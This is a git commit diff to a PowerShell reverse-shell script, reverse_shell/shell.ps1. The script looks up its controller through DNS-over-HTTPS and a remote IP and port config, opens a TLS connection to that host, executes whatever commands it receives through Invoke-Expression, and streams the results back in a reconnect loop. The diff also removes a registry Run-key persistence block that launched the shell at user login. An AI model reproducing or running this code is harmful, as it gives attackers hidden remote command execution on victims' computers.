231d90b42e892cca8a004118ae70fc53e718a570
soumyo001 <www.soumyo@gmail.com>
2025-10-11 02:00:03 +0600

    reverseshell scripts

--- reverse_shell/shell.ps1
+++ reverse_shell/shell.ps1
@@ -1,13 +1,9 @@
-# Persistence: Add to registry for auto-run on user login
-$scriptPath = $MyInvocation.MyCommand.Path
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentReverseShell" -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force
-
 function DNSLookup($DNSRecord){
     $response = (Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept' = 'application/dns-json'}).content
     return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
 }
 
-$j = Invoke-RestMethod -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/ip_port.json"
+$j = Invoke-RestMethod -Uri "SERVER_WHERE_IP_PORT_HOSTED"
 
 $remoteIP = $j.IP
 $remotePort = $j.PORT
@@ -34,8 +30,8 @@ while ($true) {
         $streamWriter = New-Object System.IO.StreamWriter($sslStream)
 
         function writeStreamToServer($string){
-            # Send output in chunks to avoid overflow
-            $chunkSize = 65536  # 64KB chunks
+            $chunkSize = $TCPConnection.ReceiveBufferSize
+            [byte[]]$script:buffer = 0..$chunkSize | % {0}
             $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string + 'SHELL '+(Get-Location).Path +' :>')
             for ($i = 0; $i -lt $stringBytes.Length; $i += $chunkSize) {
                 $chunk = $stringBytes[$i..($i + $chunkSize - 1)]
@@ -46,18 +42,10 @@ while ($true) {
 
         writeStreamToServer ''
 
-        # Read command input in chunks
-        $buffer = New-Object byte[] 65536  # 64KB buffer
-        $commandBuilder = New-Object System.Text.StringBuilder
-
-        while (($bytesRead = $sslStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-            $commandBuilder.Append([System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)) | Out-Null
-        }
-
-        # Process command only when complete
-        $command = $commandBuilder.ToString().Trim()
-
-        if ($command) {
+        while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
+        
+            $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)
+        
             $command_output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             }
@@ -66,15 +54,15 @@ while ($true) {
             }
             writeStreamToServer($command_output)
         }
-
         $streamWriter.Close()
         $sslStream.Close()
         $TCPConnection.Close()
-    } catch {
+    }
+    catch {
         if ($streamWriter) { $streamWriter.Close() }
         if ($sslStream) { $sslStream.Close() }
         if ($TCPConnection) { $TCPConnection.Close() }
     }
 
-    Start-Sleep -Seconds 30  # Reconnect delay
+    Start-Sleep -Seconds 2
 }
